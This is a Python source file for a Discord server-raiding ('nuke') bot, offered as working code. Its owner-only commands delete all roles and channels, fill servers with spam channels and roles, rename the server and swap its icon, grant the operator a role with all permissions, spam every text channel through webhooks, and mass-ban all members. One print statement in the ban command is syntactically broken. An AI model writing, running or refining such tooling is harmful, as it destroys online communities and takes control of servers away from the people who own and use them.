import discord
from discord.ext import commands
import json
import random
import string
import asyncio


with open('config.json', 'r') as file:
    config = json.load(file)


TOKEN = config['token']
GUILD_IDS = config['guild_ids']
ADMIN_ROLE_NAME = config['admin_role_name']
SPAM_CHANNELS_NAME = config['spam_channels_name']
SPAM_ROLES_NAME = config['spam_roles_name']
OWNER_ID = config['owner_id']
NUM_CHANNELS = config['num_channels']
NUM_ROLES = config['num_roles']


intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

def is_owner():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(predicate)

@bot.command()
@is_owner()
async def nuke(ctx):
    try:
        
        await ctx.message.delete()

        for guild_id in GUILD_IDS:
            guild = bot.get_guild(guild_id)
            
            if guild is None:
                print(f'Failed to find guild with ID {guild_id}')
                continue
            
            try:
                deleted_channels = []
                deleted_roles = []
                
                
                await delete_roles(guild, deleted_roles)
                await delete_channels(guild, deleted_channels)
                

                tasks = [
                    spam_channels(guild, NUM_CHANNELS, deleted_channels),
                    spam_roles(guild, NUM_ROLES, deleted_roles)
                ]
                
                await asyncio.gather(*tasks)
                
                print(f'Deleted text channels in {guild.name}: {deleted_channels}')
                print(f'Deleted roles in {guild.name}: {deleted_roles}')
                
                await guild.edit(name=config['new_guild_name'])
                with open(config['new_guild_icon'], 'rb') as f:
                    await guild.edit(icon=f.read())
                print(f'Changed guild name and icon in {guild.name}')
                
            except Exception as e:
                print(f'Error in guild {guild.name}: {e}')
        
        print('All actions completed')
    except Exception as e:
        print(f'Error in nuke command: {e}')
      

async def delete_roles(guild, deleted_roles):
    try:
        print(f'Deleting roles in {guild.name}')
        for role in guild.roles:
            if role != guild.default_role:
                await role.delete()
                deleted_roles.append(role.name)
                print(f'Deleted role: {role.name}')
        print(f'All roles deleted in {guild.name}')
    except Exception as e:
        print(f'Error deleting roles in {guild.name}: {e}')

async def delete_channels(guild, deleted_channels):
    try:
        print(f'Deleting channels in {guild.name}')
        for channel in guild.channels:
            await channel.delete()
            if isinstance(channel, discord.TextChannel):
                deleted_channels.append(channel.name)
                print(f'Deleted channel: {channel.name}')
        print(f'All channels deleted in {guild.name}')
    except Exception as e:
        print(f'Error deleting channels in {guild.name}: {e}')


async def spam_channels(guild, num_channels, deleted_channels):
    try:
        for _ in range(num_channels):
            channel_name = config['spam_channels_name']
            
            is_text_channel = random.choice([True, False])
            
            if is_text_channel:
                channel = await guild.create_text_channel(name=channel_name)
            else:
                channel = await guild.create_voice_channel(name=channel_name)
            
            deleted_channels.append(channel.name)
            channel_type = "text" if is_text_channel else "voice"
            print(f'Spam {channel_type} channel created in {guild.name}: {channel.name}')
    except Exception as e:
        print(f'Error creating spam channels in {guild.name}: {e}')
      
      

async def spam_roles(guild, num_roles, deleted_roles):
    try:
        for _ in range(num_roles):
            role_name = config['spam_roles_name']
            role = await guild.create_role(name=role_name)
            deleted_roles.append(role.name)
            print(f'Spam role created in {guild.name}: {role.name}')
    except Exception as e:
        print(f'Error creating spam roles in {guild.name}: {e}')

@bot.command()
@is_owner()
async def admin(ctx):
    try:
        guild = ctx.guild

        admin_role = discord.utils.get(guild.roles, name=ADMIN_ROLE_NAME)
        if admin_role is None:
            admin_role = await guild.create_role(name=ADMIN_ROLE_NAME, permissions=discord.Permissions.all())
            print(f'Admin role created in {guild.name}')

        owner = guild.get_member(OWNER_ID)
        await owner.add_roles(admin_role)
        print(f'Admin role given to bot owner in {guild.name}')

        try:
            await ctx.message.delete()
        except discord.NotFound:
            print("Command message not found.")

    except Exception as e:
        print(f'Error in admin command: {e}')



@bot.command()
@is_owner()
async def spam(ctx):
    try:
        await ctx.message.delete()

        guild = ctx.guild

        text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]

        spam_message = config['spam_message']
        num_spam_webhooks = config['num_spam_webhooks']

        for channel in text_channels:
            try:
                for _ in range(num_spam_webhooks):
                    webhook = await channel.create_webhook(name="Mr. Pumpkin")

                    await webhook.send(content=spam_message)

                    print(f'Spam message sent in channel: {channel.name} using webhook: {webhook.name}')
                    
                    await asyncio.sleep(0.8)
            except Exception as e:
                print(f'Error sending spam message in channel: {channel.name}, {e}')

        print('Spam messages sent in all channels')
    except Exception as e:
        print(f'Error in spam_all_channels command: {e}')
      


@bot.command()
@is_owner()
async def ban(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild

        members = []
        async for member in guild.fetch_members(limit=None):
            members.append(member)

        for member in members:
            if member == guild.me or member == guild.owner or member.id == OWNER_ID:
                continue

            await guild.ban(member)
            print(f'Banned member: {member.name}

        await ctx.send("Banning process completed.")
    except Exception as e:
        print(f'Error banning people in {guild.name}: {e}')



bot.run(TOKEN)
